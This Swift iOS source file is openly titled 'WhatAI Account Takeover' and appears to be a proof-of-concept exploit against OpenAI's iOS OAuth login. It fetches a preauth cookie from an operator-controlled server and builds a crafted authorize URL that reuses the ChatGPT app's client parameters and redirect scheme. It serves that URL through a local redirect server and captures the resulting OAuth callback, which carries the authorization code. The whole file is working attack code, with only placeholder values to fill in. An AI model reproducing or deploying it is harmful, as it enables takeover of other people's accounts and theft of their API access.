import SwiftUI
import AuthenticationServices

@MainActor
struct ContentView: View {
    @State private var callbackURL: String = ""
    @State private var isAuthenticating = false
    @State private var error: String?
    @State private var authSession: ASWebAuthenticationSession?
    @State private var serverStatus: String = "Stopped"
    @State private var preauthCookie: String?
    @State private var isFetchingCookie = false
    @State private var fetchStatus: String = "Waiting..."

    private let server = LocalHTTPServer()

    private var targetURL: String {
        let cookie = preauthCookie ?? "PENDING"
        // Replace the values below with your own captured OAuth parameters
        let sessionLoggingID = "YOUR_SESSION_LOGGING_ID"
        let state = "YOUR_STATE_VALUE"
        let clientID = "YOUR_CLIENT_ID"
        let iosDeviceID = "YOUR_IOS_DEVICE_ID"
        let codeChallenge = "YOUR_CODE_CHALLENGE"
        let auth0Client = "YOUR_AUTH0_CLIENT_BASE64"
        return "https://auth.openai.com/api/accounts/authorize?response_type=code&connection=google-oauth2&ios_app_version=26051406691&ccaps=default_otp&ios_app_display_version=unknown&auth_api_migration_enabled=true&preauth_cookie=\(cookie)&prompt=login&requester_metadata_app_version=1.2026.132&ext-use-new-phone-ui=true&auth_session_logging_id=\(sessionLoggingID)&country_code=CN&code_challenge_method=S256&scope=openid%20email%20profile%20offline_access%20model.request%20model.read%20organization.read%20organization.write&state=\(state)&client_id=\(clientID)&ios_device_id=\(iosDeviceID)&ext-login-allow-phone=true&redirect_uri=com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback&code_challenge=\(codeChallenge)&audience=https://api.openai.com/v1&auth0Client=\(auth0Client)"
    }

    var body: some View {
        VStack(spacing: 20) {
            Text("WhatAI Account Takeover")
                .font(.title)
                .bold()

            // Preauth Cookie Status
            VStack(alignment: .leading, spacing: 4) {
                Text("Preauth Cookie")
                    .font(.caption)
                    .bold()
                HStack {
                    Circle()
                        .fill(preauthCookie != nil ? .green : (isFetchingCookie ? .orange : .gray))
                        .frame(width: 8, height: 8)
                    if isFetchingCookie {
                        ProgressView()
                            .scaleEffect(0.6)
                        Text(fetchStatus)
                            .font(.caption2)
                    } else if let cookie = preauthCookie {
                        Text("Ready")
                            .font(.caption2)
                            .foregroundStyle(.green)
                        Text(cookie.prefix(40) + "...")
                            .font(.system(.caption2, design: .monospaced))
                            .foregroundStyle(.secondary)
                    } else {
                        Text("Not fetched")
                            .font(.caption2)
                    }
                }
                if preauthCookie != nil {
                    DisclosureGroup("Full Cookie") {
                        Text(preauthCookie!)
                            .font(.system(.caption2, design: .monospaced))
                            .textSelection(.enabled)
                    }
                    .font(.caption2)
                }
            }
            .frame(maxWidth: .infinity, alignment: .leading)
            .padding(10)
            .background(.secondary.opacity(0.1))
            .clipShape(RoundedRectangle(cornerRadius: 8))

            // Local Server Status
            HStack {
                Circle()
                    .fill(serverStatus == "Running" ? .green : .red)
                    .frame(width: 8, height: 8)
                Text("Local Server: \(serverStatus)")
                    .font(.caption2)
            }
            .frame(maxWidth: .infinity, alignment: .leading)
            .padding(10)
            .background(.secondary.opacity(0.1))
            .clipShape(RoundedRectangle(cornerRadius: 8))

            Button(action: startAuth) {
                Label("Sign in with Apple", systemImage: "person.badge.key")
                    .frame(maxWidth: .infinity)
                    .padding()
                    .background(preauthCookie != nil ? Color.blue : Color.gray)
                    .foregroundStyle(.white)
                    .clipShape(RoundedRectangle(cornerRadius: 12))
            }
            .disabled(isAuthenticating || preauthCookie == nil)

            if preauthCookie == nil && !isFetchingCookie {
                Button("Retry Fetch Cookie") {
                    Task { await fetchPreauthCookie() }
                }
                .font(.caption)
            }

            if isAuthenticating {
                ProgressView("Waiting for authentication...")
            }

            if let error {
                Text("Error: \(error)")
                    .foregroundStyle(.red)
                    .font(.caption)
                    .multilineTextAlignment(.center)
            }

            if !callbackURL.isEmpty {
                VStack(alignment: .leading, spacing: 8) {
                    Text("Callback URL:")
                        .font(.headline)
                    ScrollView {
                        Text(callbackURL)
                            .font(.system(.caption, design: .monospaced))
                            .textSelection(.enabled)
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .padding(12)
                    }
                    .frame(maxHeight: 300)
                    .background(.secondary.opacity(0.15))
                    .clipShape(RoundedRectangle(cornerRadius: 8))
                }
                .frame(maxWidth: .infinity, alignment: .leading)
            }

            Spacer()
        }
        .padding()
        .onAppear {
            Task { await fetchPreauthCookie() }
            startServer()
        }
        .onDisappear { server.stop() }
    }

    private func startServer() {
        server.onPortAssigned = { [self] port in
            serverStatus = "Running on :\(port)"
            print("Server started on port \(port)")
        }
        server.onError = { [self] err in
            serverStatus = "Error: \(err.localizedDescription)"
            print("Server start failed: \(err)")
        }

        do {
            try server.start(redirectURL: targetURL)
            serverStatus = "Starting..."
        } catch let err {
            serverStatus = "Error: \(err.localizedDescription)"
            print("Server start failed: \(err)")
        }
    }

    private func fetchPreauthCookie() async {
        isFetchingCookie = true
        fetchStatus = "Connecting to server..."
        defer { isFetchingCookie = false }

        // Set YOUR_SERVER_IP to your own server address hosting the preauth-cookie.txt file
        guard let url = URL(string: "http://YOUR_SERVER_IP/preauth-cookie.txt") else {
            fetchStatus = "Error"
            error = "Invalid URL"
            return
        }

        do {
            let config = URLSessionConfiguration.default
            config.timeoutIntervalForRequest = 10
            config.timeoutIntervalForResource = 10
            let session = URLSession(configuration: config)

            fetchStatus = "Fetching from YOUR_SERVER_IP..."
            let (data, response) = try await session.data(from: url)

            guard let httpResponse = response as? HTTPURLResponse else {
                fetchStatus = "Error"
                error = "Invalid response"
                return
            }

            fetchStatus = "Response: HTTP \(httpResponse.statusCode)"

            guard httpResponse.statusCode == 200 else {
                fetchStatus = "Error: HTTP \(httpResponse.statusCode)"
                error = "Server returned \(httpResponse.statusCode)"
                return
            }

            let cookie = String(data: data, encoding: .utf8)?
                .trimmingCharacters(in: .whitespacesAndNewlines) ?? ""

            if cookie.isEmpty {
                fetchStatus = "Error: empty response"
                error = "Server returned empty cookie"
                return
            }

            preauthCookie = cookie
            fetchStatus = "Ready"
            print("Fetched preauth cookie: \(cookie)")

            // Restart server with new cookie URL
            server.stop()
            startServer()

        } catch let err as URLError {
            fetchStatus = "Error"
            if err.code == .timedOut {
                self.error = "Request timed out"
            } else if err.code == .notConnectedToInternet {
                self.error = "No internet connection"
            } else {
                self.error = "Network error: \(err.localizedDescription)"
            }
        } catch let err {
            fetchStatus = "Error"
            self.error = "Failed: \(err.localizedDescription)"
        }
    }

    private func startAuth() {
        isAuthenticating = true
        error = nil
        callbackURL = ""

        guard let localURL = URL(string: "http://localhost:\(server.port)/") else {
            error = "Invalid local URL"
            isAuthenticating = false
            return
        }

        let session = ASWebAuthenticationSession(
            url: localURL,
            callbackURLScheme: "com.openai.chat"
        ) { url, err in
            Task { @MainActor in
                isAuthenticating = false

                if let err = err as? ASWebAuthenticationSessionError,
                   err.code == .canceledLogin {
                    error = "User cancelled"
                    return
                }

                if let err {
                    error = err.localizedDescription
                    return
                }

                if let url {
                    callbackURL = url.absoluteString
                }
            }
        }

        session.prefersEphemeralWebBrowserSession = false
        session.presentationContextProvider = PresentationAnchorProvider.shared
        session.start()
        authSession = session
    }
}

@MainActor
final class PresentationAnchorProvider: NSObject, ASWebAuthenticationPresentationContextProviding {
    static let shared = PresentationAnchorProvider()

    func presentationAnchor(for session: ASWebAuthenticationSession) -> ASPresentationAnchor {
        ASPresentationAnchor()
    }
}

#Preview {
    ContentView()
}
